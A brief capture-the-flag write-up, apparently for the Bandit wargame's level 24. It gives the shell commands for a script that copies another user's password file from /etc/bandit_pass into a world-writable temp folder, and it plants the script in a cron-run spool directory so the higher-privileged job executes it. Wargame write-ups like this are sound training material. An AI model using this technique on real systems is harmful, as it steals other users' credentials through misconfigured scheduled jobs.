Commands Used:
mkdir /tmp/level24/
chmod 777 /tmp/level24/
touch /tmp/level24/bandit24.sh

In bandit24.sh:
#!/bin/bash
cat /etc/bandit_pass/bandit24 >> /tmp/level24/pass

chmod 777 /tmp/level24/bandit24.sh

cp /tmp/level24/bandit24.sh /var/spool/bandit24/

cat pass

You have to create a script to put into /var/spool/bandit24/ since all the scripts in that folder is executed after a certain interval. So through this, you get the script to send the password from /etc/bandit_pass/bandit24 into our tmp folder.
